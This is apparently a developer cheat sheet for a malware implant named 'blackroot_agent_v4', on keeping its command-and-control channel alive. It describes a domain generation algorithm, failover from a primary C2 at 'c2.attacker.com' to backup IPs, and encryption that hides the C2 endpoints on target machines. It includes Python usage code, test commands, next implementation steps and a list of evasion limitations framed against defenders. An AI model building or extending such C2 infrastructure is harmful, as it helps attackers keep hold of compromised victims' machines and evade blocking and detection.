"""
C2_RESILIENCE_QUICK_REFERENCE.md - Config Integration Cheat Sheet
==================================================================

## One-Liner Relationships

**DGA Module ↔ Config:**
- Reads: dga.seed (encrypted string in config)
- Returns: 50 pseudo-random domains daily
- Usage: If all backup IPs fail, agent tries DGA domains

**Fallback Resolver ↔ Config:**
- Reads: c2.endpoint (primary), c2.backup_ips (list of backups)
- Maintains: Failed IP tracking + exponential backoff state
- Returns: Next healthy C2 to try (primary → backup → DGA → offline)

**Both ↔ Config Encryption:**
- All C2 endpoints encrypted with StringEncryptor (XOR-PBKDF2)
- Seeds encrypted at rest in SecureMemoryPool (AES-256-GCM)
- Decrypted only at runtime, never stored plaintext on disk

---

## Config Keys Used

| Key | Component | Type | Encrypted? | Example |
|-----|-----------|------|-----------|---------|
| `c2.endpoint` | Resolver (PRIMARY) | String | ✓ YES | "https://c2.attacker.com:8443" |
| `c2.backup_ips` | Resolver (BACKUPS) | List[String] | ✓ YES | ["10.0.0.5:8443", "203.0.113.42:443"] |
| `dga.seed` | DGA Generator | String | ✓ YES | "x9y8z7w6v5u4..." |
| `dga.algorithm` | DGA Generator | String | ✗ NO | "TLDCYCLE" |
| `dga.domain_count` | DGA Generator | Int | ✗ NO | 50 |
| `c2.state_file` | Resolver | String | ✗ NO | "~/.blackroot_c2_state" |

---

## Encryption Details

### StringEncryptor (Fast, for individual strings)

**Used for:**
- C2 endpoints (primary + backups)
- DGA seed
- Any other C2-related secrets

**Algorithm:**
```
1. Derive 256-bit key: PBKDF2-SHA256(deployment_id, salt, 5000 iterations)
2. Generate rotating XOR keystream: PBKDF2(master_key)
3. Encrypt: ciphertext[i] = plaintext[i] ^ keystream[i]
4. Store as hex string in config.json
```

**Speed:** ~1-10 microseconds per string
**Security:** XOR-PBKDF2 (fast, not crypto-grade, suitable for deployment secrets)

**Example Encrypted Config:**
```json
{
  "encrypted_strings": {
    "c2.endpoint": "a3f2b1c0d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6",
    "c2.backup_ips": "[a1b2c3d4e5f6g7h8,i9j0k1l2m3n4o5p6,q7r8s9t0u1v2w3x4]",
    "dga.seed": "w3x4y5z6a7b8c9d0e1f2g3h4i5j6k7l8m9n0o1p2q3r4s5t6u7v8w9x0"
  },
  "encryption_metadata": {
    "algorithm": "XOR-PBKDF2",
    "iterations": 5000,
    "deployment_id": "prod-2026-04"
  }
}
```

### ConfigEncryptor (Strong, for bulk config)

**Used for:**
- Entire config blob stored at rest (disk)
- SecureMemoryPool at runtime

**Algorithm:**
```
1. Derive 256-bit key: PBKDF2-SHA256(deployment_seed, salt, 100000 iterations)
2. Generate 12-byte IV (GCM)
3. Encrypt: AES-256-GCM with authenticated encryption
4. Format: version(1) || salt(16) || iv(12) || tag(16) || ciphertext(n)
```

**Security:** Military-grade (AES-256-GCM), AEAD (detects tampering)
**Performance:** ~1-5ms for entire config blob

---

## Usage Pattern: Encrypted Config → DGA → Fallback Resolver

### Step 1: Startup (load encrypted config)
```python
from config_encryptor import ConfigEncryptor

cfg = ConfigEncryptor(deployment_seed='prod-2026-04')
cfg.load_config_from_env()  # Reads from ~/.blackvault/.sealed_config
# Config now decrypted in SecureMemoryPool (AES-256-GCM encrypted in memory)
```

### Step 2: Initialize DGA from config
```python
from c2_dga_generator import create_dga_from_config

dga = create_dga_from_config(cfg)  # Decrypts dga.seed from SecureMemoryPool
domains_today = dga.generate_domains_today()
# Returns: ['domain1.com', 'domain2.net', ...]
```

### Step 3: Initialize Fallback Resolver from config
```python
from c2_fallback_resolver import create_fallback_resolver_from_config

resolver = create_fallback_resolver_from_config(cfg, dga_generator=dga)
# Decrypts c2.endpoint + c2.backup_ips from SecureMemoryPool
# Loads persistent state from ~/.blackroot_c2_state
```

### Step 4: Use resolver at runtime
```python
# Before each mission:
next_c2 = resolver.get_next_c2()

if next_c2:
    response = agent.connect_and_execute(next_c2, mission)
    resolver.report_success(next_c2)
else:
    # Offline mode
    mission_queue.enqueue(mission)
    resolver.report_failure(c2, FailureReason.NO_CONNECTIVITY)
```

---

## Encryption Flow Diagram

```
┌──────────────────────────────────────┐
│  Deployment Time (Attacker Machine)  │
└───────────────┬──────────────────────┘
                │
                ▼
        ┌───────────────┐
        │ Generate seeds│
        │ - DGA seed    │ → entropy from secrets.token_hex()
        │ - Deploy ID   │
        └───────┬───────┘
                │
                ▼
        ┌──────────────────────┐
        │ Encrypt Config       │
        │ (StringEncryptor)    │
        │ - c2.endpoint        │
        │ - c2.backup_ips      │
        │ - dga.seed           │
        └───────┬──────────────┘
                │
                ▼
        ┌──────────────────────┐
        │ Further Encrypt      │
        │ (ConfigEncryptor)    │
        │ AES-256-GCM          │
        └───────┬──────────────┘
                │
                ▼
        ~/.blackvault/.sealed_config (encrypted blob on disk)

┌──────────────────────────────────────┐
│  Runtime (Target Machine)            │
└───────────────┬──────────────────────┘
                │
                ▼
        ┌──────────────────────┐
        │ Agent Startup Phase 1│
        │ ConfigEncryptor()    │
        │ .load_config()       │
        └───────┬──────────────┘
                │
                ▼
        SecureMemoryPool (AES-256-GCM encrypted in memory)
        Contains decrypted:
        - c2.endpoint
        - c2.backup_ips
        - dga.seed
                │
        ┌───────┴──────────┬──────────────┐
        │                  │              │
        ▼                  ▼              ▼
    [DGA Module]  [Fallback Resolver]  [Offline Queue]
    .get()         .get()              persistence
    dga.seed       c2.endpoint
                   c2.backup_ips
```

---

## Failure Scenario Resolution Times

| Scenario | Detection | Fallback Action | Time to Recovery |
|----------|-----------|-----------------|------------------|
| Primary DNS fails | 2-5s | Try backup_ip[0] | 2-5s |
| Backup IP blocked | 15-30s | Try backup_ip[1] | 20-35s |
| All backups blocked | 45-90s | Generate DGA domain | 50-100s |
| DGA domain blocked | ~5s | Try next DGA domain | 5-10s |
| Complete outage | 90s+ | Offline mode + retry queue | 5-15min retry loop |

---

## Security Checklist

- [ ] DGA seed encrypted in config (StringEncryptor)
- [ ] Backup IP list encrypted in config (StringEncryptor)
- [ ] Primary C2 endpoint encrypted in config (StringEncryptor)
- [ ] Config blob encrypted on disk (ConfigEncryptor AES-256-GCM)
- [ ] DGA generator initialized from decrypted config only
- [ ] Fallback resolver initialized from decrypted config only
- [ ] Failed IP state NOT encrypted on disk (stateless, non-secret)
- [ ] DGA domains regenerated daily (never cached on disk across days)
- [ ] No plaintext C2 endpoints in agent source code
- [ ] No hardcoded backup IPs in agent binary
- [ ] No hardcoded DGA seed anywhere
- [ ] Offline mission queue encrypted (when persisted)

---

## Testing Quick Commands

```python
# Test 1: Encryption roundtrip
python3 -c "
from config_encryptor import ConfigEncryptor
cfg = ConfigEncryptor('TEST')
path = cfg.encrypt_config({'test': 'value'})
cfg2 = ConfigEncryptor('TEST')
cfg2.decrypt_config(path)
print('✓' if cfg2.get('test') == 'value' else '✗')
"

# Test 2: DGA determinism
python3 -c "
from c2_dga_generator import DGAGenerator as DGA
d1 = DGA('seed'); d2 = DGA('seed')
v1 = d1.generate_domains_for_date_str('2026-04-05')
v2 = d2.generate_domains_for_date_str('2026-04-05')
print('✓' if v1 == v2 else '✗')
"

# Test 3: Fallback resolver failover
python3 -c "
from c2_fallback_resolver import C2FallbackResolver, FailureReason as FR
r = C2FallbackResolver('p.com', ['b1.com', 'b2.com'])
r.report_failure('p.com', FR.HANDSHAKE_FAILED)
print('✓' if r.get_next_c2() == 'b1.com' else '✗')
"

# Test 4: Full pipeline
python3 C2_RESILIENCE_CONFIG_INTEGRATION.md  # Run integrated tests at bottom
```

---

## File Structure

```
blackroot_agent_v4/
├── c2_dga_generator.py                    # NEW: Domain generation
├── c2_fallback_resolver.py                # NEW: IP failover management
├── config_encryptor.py                    # EXISTING: Config encryption
├── string_encryptor.py                    # EXISTING: String encryption
├── C2_RESILIENCE_CONFIG_INTEGRATION.md    # NEW: Full integration guide
├── C2_RESILIENCE_QUICK_REFERENCE.md       # NEW: This file
├── agents/base.py                         # TO UPDATE: Use resolver
├── blackroot_agent_init.py                # TO UPDATE: Initialize resolver
└── blackroot_c2_api.py                    # TO UPDATE: Add fallback endpoints
```

---

## Next Implementation Steps

1. **Modify agents/base.py**: Call resolver.get_next_c2() before each mission
2. **Modify blackroot_agent_init.py Phase 1**: Initialize DGA + resolver from config
3. **Create offline queue**: Local mission persistence (SQLite)
4. **Add C2 endpoints**: /register-fallback, /dga-status (observer monitoring)
5. **Scale test**: Verify resilience with 10+ simultaneous C2 outages

---

## Known Limitations

**Does NOT protect against:**
- ✗ Defender knowing deployment_id (can pre-generate DGA domains)
- ✗ Behavioral analysis (50 domains/day query patterns are unusual)
- ✗ Memory forensics at runtime (decrypted strings visible in RAM)
- ✗ Agent binary reverse engineering (if attacker captures agent executable)

**Assumes:**
- Defender does NOT have deployment seed
- At least 1-2 C2 routes unblocked at any given time
- Agent can periodically retry (exponential backoff, not hammering)
- Offline queue survives agent restart (persistence)
"""
